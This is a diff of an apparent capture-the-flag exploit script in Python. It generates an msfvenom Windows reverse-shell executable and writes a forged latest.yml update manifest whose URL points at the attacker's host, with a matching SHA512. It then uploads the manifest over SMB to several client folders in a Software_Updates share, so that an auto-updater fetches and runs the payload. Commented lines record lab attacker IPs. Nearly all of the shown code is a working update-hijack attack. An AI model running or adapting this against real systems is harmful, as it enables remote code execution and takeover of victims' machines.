@@ -7,6 +7,7 @@ from pathlib import Path
 import hashlib
 import base64
 from smb.SMBConnection import SMBConnection
+import binascii
 
 def get_ip(interface):
     """find your IP on a given interface"""
@@ -19,7 +20,9 @@ def get_ip(interface):
 def gen_payload(ip, port, payload, dir):
     """generate an msfvenom payload with given IP address and port"""
 
-    cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -e x86/shikata_ga_nai -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'
+    # cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'
+
+    cmd_str = 'msfvenom -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heed\'Setup.exe"'
 
     print("Running command: " + cmd_str)
     
@@ -33,7 +36,7 @@ def get_payload(args, ip, port, path):
 
     payload_path = ""
 
-    payload_name = "heedv1'Setup1.0.1.exe"
+    payload_name = 'heed\'Setup.exe'
 
     #get payload options, taking --payload as priority over --msf_payload if both provided
     if args.payload is not None:
@@ -50,6 +53,7 @@ def get_payload(args, ip, port, path):
         
         else:
             #default payload
+            # msf_payload = "windows/x64/shell_reverse_tcp"
             msf_payload = "windows/shell_reverse_tcp"
 
             print("No --msf_payload or --payload flag provided. Using default windows/shell_reverse_tcp payload and generating with msfvenom")
@@ -83,7 +87,9 @@ def gen_checksum(filepath):
                 break
             sha512.update(data)
 
-    b64 = base64.b64encode(sha512.digest()).decode('utf-8')
+    # b64 = base64.b64encode(sha512.digest()).decode('utf-8')
+    b64 = base64.b64encode(binascii.unhexlify(sha512.hexdigest())).decode('utf-8')
+    # b64 = base64.b64encode(sha512.hexdigest()).decode('utf-8')
 
     print("Base64-encoded SHA512-sum of payload: " + b64)
 
@@ -93,25 +99,44 @@ def gen_yaml(ip, payload, size, sum, dir):
 
     print("\n=== Generating YAML File ===\n")
 
-    yml_string = ("version: 1.0.1\n"
-        "files:\n"
-        "  url: http://{ip}/{payload}\n"
-        "  sha512: {sha}\n"
-        "  size: {size}\n"
-        "path: {payload}\n"
-        "sha512: {sha}\n"
-        "releaseDate: '2021-04-21T11:17:02.627Z'"
-        ).format(ip=ip, payload=payload, sha=sum, size=size)
+    yml_string = ("version: 2.0.9\n"
+        "path: http://{ip}/{payload}\n"
+        "sha512: {sha}"
+    ).format(ip=ip, payload=payload, sha=sum)
+
+    # yml_string = ("version: 1.0.1\n"
+    #     "files:\n"
+    #     "  url: http://{ip}/{payload}\n"
+    #     "  sha512: {sha}\n"
+    #     "  size: {size}\n"
+    #     "path: http://{ip}/{payload}\n"
+    #     "sha512: {sha}\n"
+    #     "releaseDate: '2021-04-21T11:17:02.627Z'"
+    #     ).format(ip=ip, payload=payload, sha=sum, size=size)
+
+    # version: 1.0.1
+    # files:
+    #   url: http://10.10.14.193/heedv1'Setup1.0.1.exe
+    #   sha512: 0BsRscpeO3lQvkaP1fqRYWyw3lelkI/2qJ1BsshauD8kJ39nHJKFanTUVpUNRotgKkVljcEy/Is9U87FIbYrPw==
+    #   size: 73802
+    # path: http://10.10.14.193/heedv1'Setup1.0.1.exe
+    # sha512: 0BsRscpeO3lQvkaP1fqRYWyw3lelkI/2qJ1BsshauD8kJ39nHJKFanTUVpUNRotgKkVljcEy/Is9U87FIbYrPw==
+    # releaseDate: '2021-04-21T11:17:02.627Z'
+
+    # version: 1.0.1
+    # path: http://10.10.14.167/heedv1'Setup1.0.1.exe
+    # sha512: 0BsRscpeO3lQvkaP1fqRYWyw3lelkI/2qJ1BsshauD8kJ39nHJKFanTUVpUNRotgKkVljcEy/Is9U87FIbYrPw==
+    # releaseDate: '2021-04-21T11:17:02.627Z'
     
     print(yml_string)
 
     yml_path = dir + "/latest.yml"
 
-    with open(yml_path, 'a') as f:
+    with open(yml_path, 'w') as f:
         f.write(yml_string)
         f.close()
 
-    print("YAML saved at " + yml_path)
+    print("\nYAML saved at " + yml_path)
 
     return yml_path
 
@@ -135,12 +160,14 @@ def smb_upload(yml_path):
 
     conn.connect(server_ip, 445)
 
+    folders = ['client1', 'client2', 'client3']
+
     #upload yml file
     with open(yml_path, 'rb') as file:
         # conn.storeFile('client1', 'latest.yml', file)
-        resp = conn.storeFile('Software_Updates', 'client1/latest.yml', file)
-
-    print(str(resp))
+        for folder in folders:
+            resp = conn.storeFile('Software_Updates', '{}/latest.yml'.format(folder), file)
+            print("Bytes uploaded to " + folder + ": " + str(resp))
 
     conn.close()
 
